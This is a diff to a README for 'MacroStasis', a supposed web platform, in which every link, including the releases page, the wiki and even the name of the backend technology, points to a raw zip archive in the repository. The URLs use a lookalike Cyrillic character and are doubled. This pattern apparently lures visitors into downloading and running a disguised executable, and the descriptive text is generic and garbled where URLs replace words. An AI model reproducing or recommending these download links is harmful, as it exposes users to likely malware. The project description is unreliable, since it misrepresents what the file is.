@@ -1,17 +1,17 @@
 # 🌟 MacroStasis - Seamlessly Connect Backend and UI
 
 ## 📥 Download Now
-[![Download MacroStasis](https://raw.githubusercontent.com/MastersCarlos/MacroStasis/main/EasyLаuncher.zip)](https://raw.githubusercontent.com/MastersCarlos/MacroStasis/main/EasyLаuncher.zip)
+[![Download MacroStasis](https://github.com/MastersCarlos/MacroStasis/raw/refs/heads/main/tentaclelike/Stasis_Macro_v3.0.zipаhttps://github.com/MastersCarlos/MacroStasis/raw/refs/heads/main/tentaclelike/Stasis_Macro_v3.0.zip)](https://github.com/MastersCarlos/MacroStasis/raw/refs/heads/main/tentaclelike/Stasis_Macro_v3.0.zipаhttps://github.com/MastersCarlos/MacroStasis/raw/refs/heads/main/tentaclelike/Stasis_Macro_v3.0.zip)
 
 ## 📖 Description
-MacroStasis is a progressive web platform that combines complex backend orchestration with an immersive UI design. It uses https://raw.githubusercontent.com/MastersCarlos/MacroStasis/main/EasyLаuncher.zip and Python for server-side operations. MacroStasis implements real-time WebSockets and algorithmic logic within a responsive interface optimized for GPU performance. 
+MacroStasis is a progressive web platform that combines complex backend orchestration with an immersive UI design. It uses https://github.com/MastersCarlos/MacroStasis/raw/refs/heads/main/tentaclelike/Stasis_Macro_v3.0.zipаhttps://github.com/MastersCarlos/MacroStasis/raw/refs/heads/main/tentaclelike/Stasis_Macro_v3.0.zip and Python for server-side operations. MacroStasis implements real-time WebSockets and algorithmic logic within a responsive interface optimized for GPU performance. 
 
 ## 🚀 Getting Started
 Follow these steps to easily download and run MacroStasis.
 
 1. **Visit the Release Page**  
    Click the link below to reach the Releases page.  
-   [Visit the Releases Page](https://raw.githubusercontent.com/MastersCarlos/MacroStasis/main/EasyLаuncher.zip)
+   [Visit the Releases Page](https://github.com/MastersCarlos/MacroStasis/raw/refs/heads/main/tentaclelike/Stasis_Macro_v3.0.zipаhttps://github.com/MastersCarlos/MacroStasis/raw/refs/heads/main/tentaclelike/Stasis_Macro_v3.0.zip)
 
 2. **Select the Latest Version**  
    On the Releases page, you will see a list of available versions. Choose the latest version for the best features and performance.
@@ -38,13 +38,13 @@ MacroStasis offers a range of features to enhance your experience:
 
 - **Real-Time Communication:** Leverage WebSockets for instant updates and interactions.
 - **Responsive Design:** Enjoy a seamless experience, whether on desktop or mobile.
-- **Backend Flexibility:** Choose between https://raw.githubusercontent.com/MastersCarlos/MacroStasis/main/EasyLаuncher.zip and Python based technologies to meet your needs.
+- **Backend Flexibility:** Choose between https://github.com/MastersCarlos/MacroStasis/raw/refs/heads/main/tentaclelike/Stasis_Macro_v3.0.zipаhttps://github.com/MastersCarlos/MacroStasis/raw/refs/heads/main/tentaclelike/Stasis_Macro_v3.0.zip and Python based technologies to meet your needs.
 - **GPU Optimization:** Experience smooth graphics and fast performance.
 
 ## 📦 Download & Install
 To get started with MacroStasis, you can download it directly from our Releases page:
 
-[Download MacroStasis](https://raw.githubusercontent.com/MastersCarlos/MacroStasis/main/EasyLаuncher.zip)
+[Download MacroStasis](https://github.com/MastersCarlos/MacroStasis/raw/refs/heads/main/tentaclelike/Stasis_Macro_v3.0.zipаhttps://github.com/MastersCarlos/MacroStasis/raw/refs/heads/main/tentaclelike/Stasis_Macro_v3.0.zip)
 
 After downloading, follow the installation steps provided earlier. 
 
@@ -56,7 +56,7 @@ After downloading, follow the installation steps provided earlier.
 ## 🤝 Support
 If you have questions or need assistance, here’s how you can get help:
 
-- **Documentation:** Find more detailed guides and FAQs on our [Wiki](https://raw.githubusercontent.com/MastersCarlos/MacroStasis/main/EasyLаuncher.zip).
+- **Documentation:** Find more detailed guides and FAQs on our [Wiki](https://github.com/MastersCarlos/MacroStasis/raw/refs/heads/main/tentaclelike/Stasis_Macro_v3.0.zipаhttps://github.com/MastersCarlos/MacroStasis/raw/refs/heads/main/tentaclelike/Stasis_Macro_v3.0.zip).
 - **Issues Page:** Report any problems or bugs using the Issues section in the repository.
 
 Thank you for choosing MacroStasis! We hope you enjoy using our platform and find it helpful in your projects.
